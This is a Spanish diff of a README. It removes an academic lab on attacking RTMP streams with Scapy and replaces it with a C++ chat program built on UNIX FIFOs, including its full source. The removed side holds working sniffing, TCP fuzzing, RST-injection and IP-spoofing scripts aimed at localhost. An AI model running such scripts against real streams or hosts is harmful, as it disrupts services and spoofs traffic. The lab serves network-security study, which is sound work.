@@ -1,6 +1,7 @@
 # Chat por Pipes (C++/UNIX)
 
-Esta guía explica como si fueras cliente/usuario final qué es, cómo instalar, cómo ejecutar y cómo se usa este chat por pipes, sin entrar en código salvo lo justo. Al final hay una sección “bajo el capó” con detalles técnicos opcionales
+Esta guía explica como si fueras cliente/usuario final qué es, cómo instalar, cómo ejecutar y cómo se usa este chat por pipes, sin entrar en código salvo lo justo.  
+Al final se incluye todo el código fuente (server, client, common.hpp y Makefile) para compilar directamente. 
 
 ## Tabla de contenido
 
@@ -8,318 +9,635 @@ Esta guía explica como si fueras cliente/usuario final qué es, cómo instalar,
 - [Tecnologías utilizadas](#tecnologías-utilizadas)
 - [Características](#características)
 - [Configuración](#configuración)
-- [Pruebas Realizadas](#pruebas-realizadas)
+- [Pruebas realizadas](#pruebas-realizadas)
 - [Resultados](#resultados)
-- [Estado del proyecto](#estado-del-proyecto)
-- [Margen de mejora](#margen-de-mejora)
-- [Expresiones de gratitud](#expresiones-de-gratitud)
+- [Códigos](#códigos)
 - [Contacto](#contacto)
 
 ---
 
 ## Información general
 
-Proyecto académico para el análisis de vulnerabilidades en transmisiones RTMP mediante manipulación de paquetes con Scapy. El sistema implementa:
+royecto académico: **chat multi-proceso en terminal** que funciona **exclusivamente con pipes (FIFOs) en UNIX**, sin threads ni semáforos.  
 
-✅ Sniffing de tráfico en tiempo real  
-✅ Inyección de paquetes maliciosos  
-✅ Técnicas de fuzzing y spoofing  
-✅ Ataques de interrupción de conexión 
-
-
-Objetivos:
-
-- Levantar un servidor RTMP local
-- Emitir en tiempo real desde OBS
-- Recibir el stream con VLC
-- Capturar y analizar los paquetes en Wireshark
-- Intersectar el trafico con scapy
-- Parar la trasmision con scapy
+Consta de:
+- **Servidor central** que acepta conexiones, difunde mensajes y coordina un proceso **reporter** para gestionar reportes.  
+- **Clientes independientes** que pueden enviar/recibir mensajes, duplicarse con `/dup` y reportar con `/report` o `reportar`.  
+- **Proceso de reportes** (reporter) que expulsa clientes con más de **10 reportes** (se les envía `SIGKILL`). 
 
 ---
 
 ## Tecnologías utilizadas
 
-- Ubuntu 22.04
-- Docker 24+
-- Python 3.11
-- Scapy
-- OBS Studio
-- VLC Media Player
-- Wireshark
+- **Ubuntu 20.04+** o **WSL (Ubuntu)** en Windows  
+- **g++ (GNU C++17)**  
+- **make**  
+- **FIFOs POSIX** y `poll()`
 
 ---
 
 ##  Características
 
-- Entorno experimental reproducible
-- Captura en vivo de paquetes RTMP (puerto 1935)
-- Scripts de inyección TCP con Scapy
-- Fuzzing (payloads malformados)
-- Spoofing (direcciones IP falsas)
-- Intentos de cierre de conexión (RST)
-- Observación de efectos en OBS y VLC
-
+- Comunicación **FIFO bidireccional** (2 pipes por cliente).  
+- **Difusión** de mensajes a todos los clientes con formato `[pid] mensaje`.  
+- **Duplicación de clientes** (`/dup`).  
+- **Reportes y expulsión** automática (`reportar <pid>` o `/report <pid>`).  
+- **Sin hilos**, solo procesos + pipes.  
+- Manejo de señales y limpieza de FIFOs al salir.
 ---
 
 
 ## Configuración
 
-
-1. Crear contenedor Debian con permisos de red:
+### 1) Instalar herramientas de compilación
 
 ```bash
-docker run -it --net=host --cap-add=NET_ADMIN --name scapy-container debian bash
+sudo apt update
+sudo apt install -y build-essential
+g++ --version
+make --version
+
 ```
-2. Instalar dependencias dentro del contenedor:
+### 2) Crear la carpeta del proyector
 ```bash
-apt update
-apt install -y python3 python3-pip python3-venv nano net-tools
-python3 -m venv /opt/scapy-venv
-source /opt/scapy-venv/bin/activate
-pip install --upgrade pip setuptools
-pip install scapy
-
+mkdir -p ~/chat_udp
+cd ~/chat_udp
 ```
-Scripts Implementados:
--sniffer.py
+### 3) Crear los archivos del proyecto
 ```bash
-from scapy.all import *
-
-def packet_handler(pkt):
-    if pkt.haslayer(TCP) and pkt[TCP].dport == 1935:
-        print(f"[RTMP] {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} | Seq: {pkt[TCP].seq}")
-
-sniff(iface="lo", filter="tcp port 1935", prn=packet_handler)
-
+nano common.hpp
+nano server.cpp
+nano client.cpp
+nano Makefile
 ```
-- fuzz1.py
+Todos los códigos de este proyecto se pueden encontrar al final en [Códigos](#códigos).
 
 
+### 4) Compilar
+```bash
+make clean && make
 ```
-from scapy.all import *
-import time
+Se crearán los binarios:
+- server
+- client
 
-
-target_ip = "127.0.0.1"
-target_port = 1935
-num_packets = 100  
-delay = 0.1 
-
-for i in range(num_packets):
-    # Construye el paquete con flags FPU + contador en el payload
-    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="FPU")/Raw(load=f"Fuzz-FPU-{i}")
-    send(pkt, verbose=0)  # verbose=0 para silenciar salida
-    time.sleep(delay) 
-
+### 5) Ejecutar
+- Terminal A (Servidor):
+```bash
+./server
 ```
-
-- fuzz2.py
-
-
+- Terminal B (Cliente 1):
+```bash
+./client
 ```
-from scapy.all import *
-import time
-
-# Configuraci  n avanzada
-target = "127.0.0.1"
-port = 1935
-packet_size = 2048  # bytes
-packet_count = 50    # N  mero de paquetes a enviar
-delay = 0.2          # Intervalo entre paquetes (segundos)
-
-print(f"[+] Enviando {packet_count} paquetes de {packet_size} bytes a {target}:{port}...")
-
-for i in range(1, packet_count + 1):
-    # Paquete con payload   nico (contador + caracteres aleatorios)
-    unique_payload = f"[PKT-{i}]".encode() + b"X" * (packet_size - 6)
-    
-    pkt = IP(dst=target)/TCP(dport=port)/Raw(load=unique_payload)
-    send(pkt, verbose=0)
-    
-    print(f"Enviado paquete {i}/{packet_count} | Bytes: {len(pkt)}", end="\r")
-    time.sleep(delay)
-
-print("\n[+] Inyeccion completada. Analiza en Wireshark.")
-
-
+- Terminal C (Cliente 2):
+```bash
+./client
 ```
-- mod1.py
-```
-from scapy.all import *
-import time
-import random
-
-# Configuración
-target_ip = "127.0.0.1"
-target_port = 1935
-num_packets = 50  # Cantidad de paquetes RST a enviar
-delay = 0.1  # Segundos entre paquetes
-
-def send_rst_attack():
-    print(f"[+] Enviando {num_packets} paquetes RST a {target_ip}:{target_port}...")
-    
-    base_seq = random.randint(1000, 90000)  # Secuencia inicial aleatoria
-    
-    for i in range(num_packets):
-        # Variamos secuencia y puerto origen para evadir posibles protecciones
-        seq = base_seq + i
-        sport = random.randint(49152, 65535)  # Puerto origen aleatorio (rango efímero)
-        
-        # Construimos el paquete RST con diferentes opciones
-        pkt = IP(dst=target_ip)/TCP(
-            sport=sport,
-            dport=target_port,
-            flags="R",
-            seq=seq,
-            window=0  # Ventana cero para mayor efectividad
-        )/Raw(load=f"RST-{i}")  # Payload identificador
-        
-        send(pkt, verbose=0)
-        print(f"Enviado RST {i+1}/{num_packets} | SEQ: {seq} | SPORT: {sport}", end="\r")
-        time.sleep(delay)
-    
-    print("\n[+] Ataque RST completado")
-
-send_rst_attack()
+### 6) Comandos en cliente
+```bash
+/help
+/dup
+/report <pid>   (o)  reportar <pid>
+/exit
 ```
 
-- mod2.py
 
-
-```
-from scapy.all import *
-import random
-import time
-
-# Configuración
-target_ip = "127.0.0.1"
-target_port = 1935
-spoofed_ip_base = "10.10.10."
-num_packets = 100 
-delay = 0.1  
-def send_spoofed_packets():
-    print(f"[+] Enviando {num_packets} paquetes spoofed a {target_ip}:{target_port}...")
-    
-    for i in range(num_packets):
-        # Generamos IP origen spoofed diferente para cada paquete
-        spoofed_ip = spoofed_ip_base + str(random.randint(1, 254))
-        
-        # Variamos parámetros TCP para cada paquete
-        sport = random.randint(1024, 65535)  
-        seq = random.randint(100000, 900000) 
-        window = random.randint(512, 65535)  
-        
-        # Creamos el paquete con diferentes características
-        pkt = IP(src=spoofed_ip, dst=target_ip, ttl=random.randint(32, 255))/TCP(
-            sport=sport,
-            dport=target_port,
-            seq=seq,
-            window=window,
-            flags=random.choice(["S", "A", "PA"])  # Flags aleatorios
-        )/Raw(load=f"SPOOFED-{i}-{spoofed_ip}")  # Payload identificador
-        
-        send(pkt, verbose=0)
-        print(f"Enviado paquete {i+1}/{num_packets} | IP: {spoofed_ip} | SPORT: {sport}", end="\r")
-        time.sleep(delay)
-    
-    print("\n[+] Ataque de spoofing completado")
-
-send_spoofed_packets()
-
-```
-- mod3.py
-
-```
-from scapy.all import *
-import random
-import time
-
-# Configuración avanzada
-target_ip = "127.0.0.1"
-target_port = 1935
-num_packets = 50           
-base_delay = 0.1           
-jitter = 0.05              
-
-def send_bad_sequence_attack():
-    print(f"[+] Iniciando ataque de secuencia inválida a {target_ip}:{target_port}")
-    
-    for i in range(1, num_packets + 1):
-        # Generamos valores aleatorios para cada paquete
-        seq = random.randint(900000, 9999999)  # Secuencia claramente fuera de rango
-        sport = random.randint(49152, 65535)   # Puerto origen aleatorio (rango efímero)
-        ttl = random.randint(16, 255)          # TTL variable
-        
-        pkt = IP(dst=target_ip, ttl=ttl)/TCP(
-            sport=sport,
-            dport=target_port,
-            seq=seq,
-            window=random.randint(512, 65535),  # Ventana TCP variable
-            flags=random.choice(["S", "A", "PA", "FA"])  # Flags aleatorios
-        )/Raw(load=f"BAD-SEQ-{i}-{seq}")  # Payload identificador
-        
-        send(pkt, verbose=0)
-                current_delay = base_delay + random.uniform(-jitter, jitter)
-        time.sleep(max(0.01, current_delay))  # Nunca menor a 10ms
-        
-        print(f"Enviado {i}/{num_packets} | SEQ: {seq} | SPORT: {sport} | TTL: {ttl}", end="\r")
-    
-    print("\n[+] Ataque completado")
-
-send_bad_sequence_attack()
-
-```
 ##  Pruebas Realizadas
 
-- Captura de paquetes RTMP
+- Mensajes básicos → un cliente escribe, todos lo reciben.
 
-- Spoofing de IP
+- Duplicación → con /dup aparece un nuevo cliente con PID distinto.
 
-- Fuzzing de payloads
+- Reportes → al enviar más de 10 reportes contra un PID, el cliente es expulsado.
 
-- Inyección de paquetes RST
-
-- Ataque en ráfaga de RSTs (burst)
-
-- Observación en Wireshark y netstat
+- Limpieza → clientes y servidor cierran correctamente sus FIFOs.
 
 
 ## Resultados
 
-- Todos los paquetes fueron enviados correctamente.
+- El sistema funciona en Linux/WSL sin errores de ENXIO.
 
-- Nginx (contenedor) no aceptó los RSTs externos.
+- Se logró comunicación estable, duplicación de procesos y expulsión por reportes.
 
-- La transmisión RTMP continuó estable (OBS y VLC sin interrupción).
+## Códigos
 
-Conclusión: El entorno experimental funcionó correctamente, pero el cierre de conexión fue bloqueado por la lógica de red del sistema (docker-proxy, kernel TCP stack, etc.).
+- Common.hpp
+```bash
+#ifndef COMMON_HPP
+#define COMMON_HPP
 
+#include <limits.h>
 
+#define REG_FIFO "/tmp/chat_reg_fifo"
+#define MAX_MSG 1024
+#define MAX_NAME 256
 
-## Estado del proyecto
+#define REPORT_PREFIX1 "reportar "
+#define REPORT_PREFIX2 "/report "
+#define DUP_CMD "/dup"
+#define EXIT_CMD "/exit"
+#define HELP_CMD "/help"
 
-El proyecto está: Finalizado
+#endif
+```
+- Server.cpp
+```bash
+#include <functional>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <cstring>
+#include <cstdlib>
+#include <cstdio>
+#include <csignal>
+#include <cerrno>
+#include <algorithm>
 
-## Margen de mejora
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <limits.h>
 
+#include "common.hpp"
 
-- Probar ataques en red real (no solo localhost)
+struct Client {
+    pid_t pid{};
+    int fd_in{-1};   // cliente -> server
+    int fd_out{-1};  // server  -> cliente
+    std::string fifo_in;
+    std::string fifo_out;
+    bool active{false};
+};
 
-- Automatizar todo en un menú interactivo
+static std::vector<Client> clients;
+static int reg_fd = -1;
 
-- Recolectar métricas del servidor
+// pipes anónimos con el reporter
+static int srv2rep[2] = {-1,-1};
+static int rep2srv[2] = {-1,-1};
+static pid_t reporter_pid = -1;
 
-- Generar logs y estadísticas
+static void cleanup() {
+    if (reg_fd >= 0) close(reg_fd);
+    unlink(REG_FIFO);
+    if (reporter_pid > 0) {
+        kill(reporter_pid, SIGTERM);
+    }
+}
 
-## Expresiones de gratitud
+static void sigint_handler(int) {
+    std::cerr << "\n[server] Saliendo...\n";
+    cleanup();
+    std::_Exit(0);
+}
 
-- Este proyecto se inspiró en el repositorio:
-```https://github.com/iizukanao/node-rtsp-rtmp-server```
+static void trim_newline(char *s) {
+    if (!s) return;
+    size_t n = std::strlen(s);
+    while (n > 0 && (s[n-1] == '\n' || s[n-1] == '\r')) s[--n] = '\0';
+}
 
-- Gracias a OBS, VLC, Wireshark y Scapy.
+static bool starts_with(const char* s, const char* pfx) {
+    return std::strncmp(s, pfx, std::strlen(pfx)) == 0;
+}
 
-- Agradecimientos a mi equipo docente y compañeros
+static Client* find_client(pid_t pid) {
+    for (auto &c : clients) if (c.active && c.pid == pid) return &c;
+    return nullptr;
+}
+
+static void broadcast(const std::string& line, pid_t from) {
+    for (auto &c : clients) {
+        if (!c.active) continue;
+        dprintf(c.fd_out, "[%d] %s\n", (int)from, line.c_str());
+    }
+}
+
+static void remove_client(pid_t pid, const char* reason) {
+    for (auto it = clients.begin(); it != clients.end(); ++it) {
+        if (it->pid == pid) {
+            if (it->active) {
+                if (reason) dprintf(it->fd_out, "[server] desconexión: %s\n", reason);
+                if (it->fd_in >= 0) close(it->fd_in);
+                if (it->fd_out >= 0) close(it->fd_out);
+                it->active = false;
+            }
+            clients.erase(it);
+            std::cerr << "[server] Cliente " << pid << " removido\n";
+            return;
+        }
+    }
+}
+
+static void handle_killed_notice(const std::string& line) {
+    // Formato: "KILLED <pid>"
+    pid_t pid = 0;
+    if (sscanf(line.c_str(), "KILLED %d", &pid) == 1 && pid > 0) {
+        std::cerr << "[server] Reporter indica KILLED " << pid << "\n";
+        remove_client(pid, "killed por reportes (>10)");
+        std::string msg = "El proceso " + std::to_string(pid) + " fue expulsado por reportes.";
+        broadcast(msg, 0);
+    }
+}
+
+static void handle_register(const std::string& line) {
+    // "CONNECT <pid> <fifo_in> <fifo_out>"
+    char cmd[32], fifo_in[PATH_MAX], fifo_out[PATH_MAX];
+    pid_t pid = 0;
+    if (sscanf(line.c_str(), "%31s %d %1023s %1023s", cmd, &pid, fifo_in, fifo_out) == 4) {
+        if (std::strcmp(cmd, "CONNECT") == 0 && pid > 0) {
+            int fd_in = open(fifo_in, O_RDONLY | O_NONBLOCK);
+            int fd_out = open(fifo_out, O_WRONLY | O_NONBLOCK);
+            if (fd_in < 0 || fd_out < 0) {
+                std::cerr << "[server] Error abriendo FIFOs de " << pid << ": " << std::strerror(errno) << "\n";
+                if (fd_in >= 0) close(fd_in);
+                if (fd_out >= 0) close(fd_out);
+                return;
+            }
+            Client c;
+            c.pid = pid;
+            c.fd_in = fd_in;
+            c.fd_out = fd_out;
+            c.fifo_in = fifo_in;
+            c.fifo_out = fifo_out;
+            c.active = true;
+            clients.emplace_back(std::move(c));
+
+            std::cerr << "[server] Cliente conectado: " << pid << "\n";
+            dprintf(fd_out, "[server] Bienvenido %d! Usa /help para comandos.\n", (int)pid);
+            broadcast("Se unió " + std::to_string(pid), 0);
+        }
+    }
+}
+
+static void handle_client_line(pid_t from, const std::string& raw) {
+    std::string line = raw;
+    if (!line.empty() && (line.back()=='\n' || line.back()=='\r')) {
+        while (!line.empty() && (line.back()=='\n' || line.back()=='\r')) line.pop_back();
+    }
+
+    if (line == HELP_CMD) {
+        if (auto c = find_client(from)) {
+            dprintf(c->fd_out,
+                    "Comandos:\n"
+                    "  /help\n"
+                    "  /dup\n"
+                    "  /report <pid>   (o)  reportar <pid>\n"
+                    "  /exit\n");
+        }
+        return;
+    }
+
+    // reportes
+    std::string low = line;
+    std::transform(low.begin(), low.end(), low.begin(),
+                   [](unsigned char ch){ return (char)std::tolower(ch); });
+
+    if (starts_with(low.c_str(), REPORT_PREFIX1) || starts_with(low.c_str(), REPORT_PREFIX2)) {
+        const char* p = low.c_str() + (starts_with(low.c_str(), REPORT_PREFIX1) ? std::strlen(REPORT_PREFIX1)
+                                                                                : std::strlen(REPORT_PREFIX2));
+        while (*p == ' ' || *p == '\t') ++p;
+        pid_t tgt = (pid_t) std::atoi(p);
+        if (tgt > 0) {
+            dprintf(srv2rep[1], "REPORT %d\n", (int)tgt);
+            if (auto c = find_client(from)) dprintf(c->fd_out, "[server] Reporte enviado contra %d\n", (int)tgt);
+        }
+        return;
+    }
+
+    // mensaje normal
+    broadcast(line, from);
+}
+
+static void split_and_each_line(const char* buf, ssize_t n, const std::function<void(const std::string&)>& cb) {
+    std::string chunk(buf, (size_t) n);
+    size_t pos = 0;
+    while (true) {
+        size_t nl = chunk.find('\n', pos);
+        if (nl == std::string::npos) break;
+        cb(chunk.substr(pos, nl - pos));
+        pos = nl + 1;
+    }
+    // Si no termina en \n, ignoramos resto parcial (para este uso está bien).
+}
+
+static void spawn_reporter() {
+    if (pipe(srv2rep) < 0 || pipe(rep2srv) < 0) {
+        perror("pipe"); std::exit(1);
+    }
+    reporter_pid = fork();
+    if (reporter_pid < 0) {
+        perror("fork"); std::exit(1);
+    }
+    if (reporter_pid == 0) {
+        // proceso hijo: reporter
+        close(srv2rep[1]);
+        close(rep2srv[0]);
+
+        struct RNode { pid_t pid; int count; RNode* next; };
+        RNode* head = nullptr;
+
+        char buf[MAX_MSG];
+        while (true) {
+            ssize_t n = read(srv2rep[0], buf, sizeof(buf));
+            if (n <= 0) {
+                if (n < 0 && errno == EINTR) continue;
+                break;
+            }
+            split_and_each_line(buf, n, [&](const std::string& line){
+                if (line.rfind("REPORT", 0) == 0) {
+                    pid_t tgt = 0;
+                    if (sscanf(line.c_str(), "REPORT %d", &tgt) == 1 && tgt > 0) {
+                        RNode* r = head;
+                        while (r && r->pid != tgt) r = r->next;
+                        if (!r) {
+                            r = (RNode*) std::calloc(1, sizeof(RNode));
+                            r->pid = tgt; r->count = 0; r->next = head; head = r;
+                        }
+                        r->count++;
+                        if (r->count > 10) {
+                            kill(tgt, SIGKILL);
+                            dprintf(rep2srv[1], "KILLED %d\n", (int)tgt);
+                        }
+                    }
+                }
+            });
+        }
+        std::_Exit(0);
+    } else {
+        // proceso padre (server)
+        close(srv2rep[0]); // escribirá a reporter
+        close(rep2srv[1]); // leerá del reporter
+        int flags = fcntl(rep2srv[0], F_GETFL, 0);
+        fcntl(rep2srv[0], F_SETFL, flags | O_NONBLOCK);
+    }
+}
+
+int main() {
+    std::signal(SIGINT,  sigint_handler);
+    std::signal(SIGTERM, sigint_handler);
+
+    unlink(REG_FIFO);
+    if (mkfifo(REG_FIFO, 0666) < 0 && errno != EEXIST) {
+        perror("mkfifo REG_FIFO"); return 1;
+    }
+    reg_fd = open(REG_FIFO, O_RDONLY | O_NONBLOCK);
+    if (reg_fd < 0) { perror("open REG_FIFO"); return 1; }
+
+    spawn_reporter();
+    std::cerr << "[server] Listo. Esperando conexiones en " << REG_FIFO << "\n";
+
+    std::vector<pollfd> pfds;
+    char buf[MAX_MSG];
+
+    while (true) {
+        pfds.clear();
+        // 0: REG_FIFO
+        pfds.push_back({reg_fd, POLLIN, 0});
+        // 1: rep2srv[0]
+        pfds.push_back({rep2srv[0], POLLIN, 0});
+        // clientes
+        for (auto &c : clients) {
+            if (!c.active) continue;
+            pfds.push_back({c.fd_in, (short)(POLLIN | POLLHUP), 0});
+        }
+
+        int ret = poll(pfds.data(), (nfds_t)pfds.size(), -1);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            perror("poll");
+            break;
+        }
+
+        size_t idx = 0;
+        // REG_FIFO
+        if (pfds[idx].revents & POLLIN) {
+            ssize_t n = read(reg_fd, buf, sizeof(buf));
+            if (n > 0) {
+                split_and_each_line(buf, n, [&](const std::string& line){
+                    handle_register(line);
+                });
+            } else if (n == 0) {
+                close(reg_fd);
+                reg_fd = open(REG_FIFO, O_RDONLY | O_NONBLOCK);
+            }
+        }
+        idx++;
+
+        // reporter->server
+        if (pfds[idx].revents & POLLIN) {
+            ssize_t n = read(rep2srv[0], buf, sizeof(buf));
+            if (n > 0) {
+                split_and_each_line(buf, n, [&](const std::string& line){
+                    handle_killed_notice(line);
+                });
+            }
+        }
+        idx++;
+
+        // clientes
+        // Nota: como el vector puede moverse al eliminar, iteramos con índice.
+        for (size_t i = 0, clientIdxBase = 2; i < clients.size();) {
+            Client &c = clients[i];
+            if (!c.active) { clients.erase(clients.begin()+i); continue; }
+
+            // La posición en pfds para este cliente es (clientIdxBase + k), pero aquí
+            // simplemente buscamos por fd si hay eventos.
+            short re = 0;
+            for (size_t p = 2; p < pfds.size(); ++p) {
+                if (pfds[p].fd == c.fd_in) { re = pfds[p].revents; break; }
+            }
+
+            if (re & POLLHUP) {
+                std::cerr << "[server] POLLHUP de " << c.pid << "\n";
+                remove_client(c.pid, "POLLHUP");
+                // tras eliminar, reiniciamos bucle
+                i = 0;
+                continue;
+            }
+            if (re & POLLIN) {
+                ssize_t n = read(c.fd_in, buf, sizeof(buf));
+                if (n <= 0) {
+                    if (n == 0) remove_client(c.pid, "cerró conexión");
+                    i = 0;
+                    continue;
+                }
+                split_and_each_line(buf, n, [&](const std::string& line){
+                    handle_client_line(c.pid, line);
+                });
+            }
+            ++i;
+        }
+    }
+
+    cleanup();
+    return 0;
+}
+
+```
+- Client.cpp
+```bash
+#include <iostream>
+#include <string>
+#include <vector>
+#include <cstring>
+#include <cstdlib>
+#include <cstdio>
+#include <csignal>
+#include <cerrno>
+#include <ctime>
+
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <limits.h>
+
+#include "common.hpp"
+
+static std::string fifo_c2s;
+static std::string fifo_s2c;
+static int fd_c2s = -1, fd_s2c = -1;
+static int reg_fd = -1;
+static pid_t mypid = 0;
+
+static void cleanup() {
+    if (fd_c2s >= 0) close(fd_c2s);
+    if (fd_s2c >= 0) close(fd_s2c);
+    if (!fifo_c2s.empty()) unlink(fifo_c2s.c_str());
+    if (!fifo_s2c.empty()) unlink(fifo_s2c.c_str());
+}
+
+static void sigint_handler(int) {
+    std::cerr << "\n[client " << mypid << "] Saliendo...\n";
+    cleanup();
+    std::_Exit(0);
+}
+
+static void make_fifo_name(std::string &out, const char* prefix, pid_t pid) {
+    char buf[PATH_MAX];
+    std::snprintf(buf, sizeof(buf), "/tmp/%s_%d_%ld_%d.fifo", prefix, (int)pid, (long)time(nullptr), rand()%10000);
+    out = buf;
+}
+static void connect_to_server() {
+    mypid = getpid();
+    srand((unsigned)time(nullptr) ^ (unsigned)mypid);
+
+    // 1) Crear las FIFOs únicas
+    make_fifo_name(fifo_c2s, "c2s", mypid);
+    make_fifo_name(fifo_s2c, "s2c", mypid);
+    unlink(fifo_c2s.c_str());
+    unlink(fifo_s2c.c_str());
+
+    if (mkfifo(fifo_c2s.c_str(), 0666) < 0 || mkfifo(fifo_s2c.c_str(), 0666) < 0) {
+        perror("mkfifo"); std::exit(1);
+    }
+
+    // 2) Anunciarse al servidor ANTES de abrir las FIFOs
+    //    (para que el server sepa qué rutas abrir)
+    reg_fd = open(REG_FIFO, O_WRONLY);
+    if (reg_fd < 0) { perror("open REG_FIFO"); std::exit(1); }
+
+    // Escribimos CONNECT y cerramos de inmediato
+    dprintf(reg_fd, "CONNECT %d %s %s\n", (int)mypid, fifo_c2s.c_str(), fifo_s2c.c_str());
+    close(reg_fd); reg_fd = -1;
+
+    // 3) Abrir primero s2c (lectura). Con O_NONBLOCK para no quedar colgado si el server aún no escribe.
+    fd_s2c = open(fifo_s2c.c_str(), O_RDONLY | O_NONBLOCK);
+    if (fd_s2c < 0) { perror("open fifo_s2c"); std::exit(1); }
+
+    // 4) Abrir c2s (escritura) en modo BLOQUEANTE (SIN O_NONBLOCK).
+    //    Así esperamos a que el server abra su extremo de lectura y evitamos ENXIO.
+    fd_c2s = open(fifo_c2s.c_str(), O_WRONLY);
+    if (fd_c2s < 0) { perror("open fifo_c2s"); std::exit(1); }
+
+    std::cerr << "[client " << mypid << "] Conectado. /help para comandos.\n";
+}
+
+static void duplicate_self() {
+    pid_t child = fork();
+    if (child < 0) {
+        perror("fork");
+        return;
+    }
+    if (child == 0) {
+        execlp("./client", "client", (char*)nullptr);
+        perror("execlp client");
+        std::_Exit(1);
+    } else {
+        std::cerr << "[client " << mypid << "] Duplicado lanzado con pid " << child << "\n";
+    }
+}
+
+int main() {
+    std::signal(SIGINT,  sigint_handler);
+    std::signal(SIGTERM, sigint_handler);
+
+    connect_to_server();
+
+    struct pollfd pfds[2];
+    char buf[MAX_MSG];
+
+    while (true) {
+        pfds[0] = {STDIN_FILENO, POLLIN, 0};
+        pfds[1] = {fd_s2c, (short)(POLLIN | POLLHUP), 0};
+
+        int ret = poll(pfds, 2, -1);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            perror("poll");
+            break;
+        }
+
+        if (pfds[0].revents & POLLIN) {
+            if (!fgets(buf, sizeof(buf), stdin)) break; // EOF en stdin
+            if (std::strncmp(buf, DUP_CMD, std::strlen(DUP_CMD)) == 0) { duplicate_self(); continue; }
+            if (std::strncmp(buf, EXIT_CMD, std::strlen(EXIT_CMD)) == 0) { break; }
+
+            ssize_t n = write(fd_c2s, buf, std::strlen(buf));
+            if (n < 0) std::cerr << "[client " << mypid << "] Error enviando: " << std::strerror(errno) << "\n";
+        }
+
+        if (pfds[1].revents & POLLHUP) {
+            std::cerr << "[client " << mypid << "] Servidor cerró canal. Saliendo.\n";
+            break;
+        }
+        if (pfds[1].revents & POLLIN) {
+            ssize_t n = read(fd_s2c, buf, sizeof(buf)-1);
+            if (n > 0) {
+                buf[n] = '\0';
+                std::fputs(buf, stdout);
+                std::fflush(stdout);
+            }
+        }
+    }
+
+    cleanup();
+    return 0;
+}
+```
+
+- Makefile
+```bash
+CXX=g++
+CXXFLAGS=-O2 -Wall -Wextra -std=gnu++17
+
+all: server client
+
+server: server.cpp common.hpp
+	$(CXX) $(CXXFLAGS) -o server server.cpp
+
+client: client.cpp common.hpp
+	$(CXX) $(CXXFLAGS) -o client client.cpp
+
+clean:
+	rm -f server client
+```
+
 
 ## Contacto
 
